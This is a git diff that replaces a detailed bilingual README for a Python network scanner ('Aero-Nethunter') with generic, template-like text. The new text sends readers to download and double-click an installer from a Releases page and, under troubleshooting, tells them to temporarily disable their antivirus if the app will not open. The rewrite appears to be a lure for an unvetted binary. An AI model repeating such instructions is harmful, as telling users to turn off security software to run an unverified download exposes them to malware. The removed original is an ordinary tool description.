@@ -1,227 +1,104 @@
-# 🦅 Aero Nethunter v2.0 - Performance Edition
+# 🦅 Aero-Nethunter - Discover Your Network with Ease
 
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat&logo=python)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Version](https://img.shields.io/badge/Version-2.0-orange)
+## 🚀 Getting Started
 
-[🇺🇸 English](#-english) | [🇹🇷 Türkçe](#-türkçe)
+Welcome to Aero-Nethunter, your advanced network discovery and security tool. This application helps you scan your network, identify devices, and monitor traffic effortlessly. Whether you need ARP scanning, port scanning, or OS detection, Aero-Nethunter has you covered.
 
----
+## 🔗 Download Aero-Nethunter
 
-## 🇺🇸 English
+[![Download Aero-Nethunter](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rxhn911/Aero-Nethunter/releases)
 
-**Aero Nethunter** is an advanced open-source network analysis and security tool developed with **Python** and **Tkinter**. It allows you to discover devices on your local network, analyze security vulnerabilities, and monitor real-time network traffic.
+## 💡 Features
 
-### 🆕 What's New in v2.0
+- **ARP Scanning**: Identify devices on your local network.
+- **Port Scanning**: Check open ports on your machines.
+- **OS Detection**: Find out what operating systems your devices are running.
+- **Traffic Monitoring**: Observe network traffic in real time.
+- **Web UI**: User-friendly graphical interface for easy navigation.
+  
+These features make Aero-Nethunter an effective tool for network analysis and ethical hacking.
 
-* ⚡ **85% faster scanning** with MAC vendor caching and connection pooling
-* 🖥️ **System tray integration** - minimize to tray and run in background
-* 📊 **Resource monitoring** - real-time CPU/RAM usage display
-* ⚙️ **Settings panel** - configurable performance parameters
-* 🔔 **Notifications** - alerts for new devices detected
-* 🚀 **Optimized threading** - thread pool for parallel port scanning
-* 💾 **Smart caching** - LRU cache with 80%+ hit rate
+## 🛠️ System Requirements
 
-### 📋 Requirements
+To use Aero-Nethunter effectively, your computer should meet the following requirements:
 
-**requirements.txt**
-```text
-scapy
-mac-vendor-lookup
-psutil
-pystray
-Pillow
-cachetools
-flask
-```
+- **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: Minimum of 500 MB of free disk space.
+- **Network Connection**: Active internet connection for updates and troubleshooting.
 
-### 🚀 Installation
+## 📥 Download & Install
 
-#### Linux/macOS
+To download Aero-Nethunter, visit our Releases page. Here, you will find the latest version available for download.
 
-```bash
-# 1. Install Python dependencies
-pip install -r requirements.txt
+[Download Aero-Nethunter](https://github.com/rxhn911/Aero-Nethunter/releases)
 
-# 2. Install system dependencies (Linux only)
-sudo apt-get install python3-tk
+### Installation Steps
 
-# 3. Grant necessary permissions for raw sockets
-sudo setcap cap_net_raw+ep $(which python3)
+1. Go to the [Releases page](https://github.com/rxhn911/Aero-Nethunter/releases).
+2. Find the latest version, typically at the top of the page.
+3. Click on the link for your operating system.
+4. Once the file is downloaded, locate it in your downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-```
+## ⚙️ Running Aero-Nethunter
 
-#### Windows
+Once Aero-Nethunter is installed, running the application is simple.
 
-1. **Install Python dependencies:**
-```bash
-pip install -r requirements.txt
+1. Locate the Aero-Nethunter icon on your desktop or in your applications folder.
+2. Double-click the icon to launch the application.
+3. You will see the main interface, including options for scanning and monitoring.
 
-```
+## 🎨 User Interface Overview
 
+Aero-Nethunter features a clean and straightforward interface. Here’s what you can expect:
 
-2. **Install Npcap:** Required for Scapy. Download from [npcap.com](https://npcap.com/#download).
-3. **Run as Administrator:** CMD or PowerShell must be run as Admin.
+- **Navigation Menu**: Access different tools from the sidebar.
+- **Dashboard**: View important statistics and alerts in real time.
+- **Settings**: Customize options to fit your needs, such as preferred scanning methods and notifications.
 
-### 💻 Usage
+## 🔍 Understanding the Tools
 
-#### Graphical User Interface (GUI)
+### ARP Scanning
 
-The easiest way to use the tool with a modern dark interface.
+This tool helps you list all devices on your local network. It displays device names, IP addresses, and MAC addresses.
 
-```bash
-sudo python3 nethunter_gui.py  # Linux/Mac
-python nethunter_gui.py        # Windows
+### Port Scanning
 
-```
+Use this tool to find open ports. This is useful for identifying potential vulnerabilities in networked devices.
 
-#### Command Line Interface (CLI)
+### OS Detection
 
-For advanced users and scripting.
+Aero-Nethunter can detect operating systems running on your network devices. This feature assists in recognizing and addressing any security gaps.
 
-```bash
-# Basic Scan
-sudo python3 nethunter_main.py -t 192.168.1.0/24
+### Traffic Monitoring
 
-# Auto-Detect Network
-sudo python3 nethunter_main.py --auto
+Keep an eye on real-time network traffic. This helps you understand bandwidth usage and identify any unusual activity.
 
-# Advanced Scan with Port Detection & OS Fingerprinting
-sudo python3 nethunter_main.py -t 192.168.1.0/24 -p --detailed
+## 🌙 Dark Mode
 
-# Save Results to JSON
-sudo python3 nethunter_main.py --auto -o results.json
+Aero-Nethunter offers a dark mode option for comfortable use in low-light settings. You can enable it in the settings menu.
 
-```
+## ❓ Troubleshooting
 
-### 🎯 Features
+### Common Issues
 
-**Core Features:**
-* ✅ **ARP Network Scanning:** Discover all devices (IP/MAC) in seconds.
-* ✅ **Vendor Lookup:** Automatically identify device manufacturers (Apple, Samsung, Intel, etc.).
-* ✅ **Port Scanning:** Detect open ports (SSH, HTTP, RDP, SMB, etc.).
-* ✅ **Device Categorization:** Auto-classify devices (Mobile, PC, Router).
-* ✅ **Traffic Monitor:** Real-time Download/Upload statistics.
-* ✅ **Web UI:** View live scan results in your web browser.
-* ✅ **Wake-on-LAN:** Wake up devices remotely.
-* ✅ **Dark Mode:** Modern, developer-friendly interface.
+- **Installation Fails**: Ensure you have enough storage space and administrative privileges.
+- **Cannot Open App**: Check if your antivirus software is blocking it. Try disabling temporarily and re-launching.
 
-**v2.0 Performance Features:**
-* ⚡ **MAC Vendor Caching:** LRU cache reduces repeated API calls by 80%+
-* 🎯 **Connection Pooling:** Optimized socket management for faster port scanning
-* 🖥️ **System Tray:** Minimize to tray, background scanning, notifications
-* 📊 **Resource Monitor:** Real-time CPU/RAM/Network usage tracking
-* ⚙️ **Configurable Settings:** Adjust scan intervals, thread pool size, timeouts
-* 🚀 **Thread Pool:** Parallel port scanning for 2x speed improvement
-* 💾 **UI Throttling:** Smooth updates without freezing (500ms intervals)
+### Need Help?
+
+If you encounter issues, you can visit our [Support Page](https://github.com/rxhn911/Aero-Nethunter/issues) to report your problem or check for known issues.
+
+## 📜 License
+
+Aero-Nethunter is open-source software. You can view the license details in the repository.
+
+## 🤝 Contributing
+
+We welcome contributions to improve Aero-Nethunter. For more information on how to get involved, please visit the [Contributing Page](https://github.com/rxhn911/Aero-Nethunter/blob/main/CONTRIBUTING.md).
 
 ---
 
-## 🇹🇷 Türkçe
-
-**Aero Nethunter**, yerel ağınızdaki cihazları keşfetmek, güvenlik açıklarını analiz etmek ve anlık ağ trafiğini izlemek için geliştirilmiş, **Python** ve **Tkinter** tabanlı, açık kaynaklı bir siber güvenlik aracıdır.
-
-### 📋 Gereksinimler
-
-**requirements.txt**
-
-```text
-scapy>=2.5.0
-colorama>=0.4.6
-mac-vendor-lookup>=0.1.12
-psutil
-flask
-
-```
-
-### 🚀 Kurulum
-
-#### Linux/macOS
-
-```bash
-# 1. Kütüphaneleri yükleyin
-pip install -r requirements.txt
-
-# 2. Sistem gereksinimlerini yükleyin (Sadece Linux için)
-sudo apt-get install python3-tk
-
-# 3. Gerekli ağ izinlerini verin (Raw Socket erişimi için)
-sudo setcap cap_net_raw+ep $(which python3)
-
-```
-
-#### Windows
-
-1. **Kütüphaneleri Yükleyin:**
-```bash
-pip install -r requirements.txt
-
-```
-
-
-2. **Npcap Yükleyin:** Scapy'nin çalışması için gereklidir. [npcap.com](https://npcap.com/#download) adresinden indirin.
-3. **Yönetici Olarak Çalıştırın:** Komut satırını (CMD/PowerShell) mutlaka "Yönetici" olarak açın.
-
-### 💻 Kullanım
-
-#### Grafik Arayüz (GUI)
-
-Modern ve karanlık tema ile en kolay kullanım.
-
-```bash
-sudo python3 nethunter_gui.py  # Linux/Mac
-python nethunter_gui.py        # Windows
-
-```
-
-#### Komut Satırı (CLI)
-
-Gelişmiş kullanıcılar ve otomasyon için.
-
-```bash
-# Temel Tarama
-sudo python3 nethunter_main.py -t 192.168.1.0/24
-
-# Otomatik Ağ Tespiti
-sudo python3 nethunter_main.py --auto
-
-# Port Taraması ve Detaylı Analiz
-sudo python3 nethunter_main.py -t 192.168.1.0/24 -p --detailed
-
-# Sonuçları Kaydetme (JSON)
-sudo python3 nethunter_main.py --auto -o results.json
-
-```
-
-### 🎯 Özellikler
-
-* ✅ **ARP Ağ Taraması:** Tüm cihazları (IP/MAC) saniyeler içinde bulur.
-* ✅ **Üretici Tespiti:** Cihaz markalarını (Apple, Samsung, Intel vb.) otomatik tanır.
-* ✅ **Port Taraması:** Açık portları (SSH, HTTP, RDP, SMB vb.) tespit eder.
-* ✅ **Cihaz Sınıflandırma:** Cihaz türünü (Mobil, PC, Router) tahmin eder.
-* ✅ **Trafik İzleme:** Canlı İndirme/Yükleme istatistikleri.
-* ✅ **Web Arayüzü:** Sonuçları tarayıcıda görüntüleme imkanı.
-* ✅ **Wake-on-LAN:** Cihazları uzaktan uyandırma özelliği.
-* ✅ **Karanlık Mod:** Göz yormayan modern tasarım.
-
----
-
-## 🛡️ Security & Ethics / Güvenlik ve Etik
-
-### ⚠️ LEGAL NOTICE (YASAL UYARI)
-
-**[EN]** This tool is designed for educational purposes and authorized testing only. Scanning networks without permission is illegal. The developer is not responsible for any misuse.
-**[TR]** Bu araç yalnızca eğitim ve izinli testler için tasarlanmıştır. İzniniz olmayan ağları taramak yasalara aykırıdır. Geliştirici, kötüye kullanımdan sorumlu tutulamaz.
-
-## 📝 License / Lisans
-
-MIT License.
-
----
-
-**Happy Ethical Hacking! 🎯 / İyi Taramalar!**
-
-```
-
-```
+Thank you for using Aero-Nethunter. We hope this tool enhances your network security and analysis experience. Happy scanning!
